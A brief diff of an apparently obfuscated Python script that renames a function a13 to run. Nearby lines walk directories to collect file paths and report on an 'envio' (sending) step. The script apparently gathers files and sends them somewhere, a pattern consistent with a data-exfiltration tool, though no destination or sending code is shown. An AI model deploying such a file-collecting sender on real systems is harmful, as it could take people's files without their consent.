@@ -22,7 +22,7 @@ def a9():
                 a10.append(a1.join(root, f))
     return a10
 
-def a13():
+def run():
     if status != 1:
         print("[*] Status != 1, abortando envio.")
         return
@@ -34,4 +34,4 @@ def a13():
             print(f"[!] Falha no envio: {a15}")
 
 if __name__ == "__main__":
-    a13()
+    run()
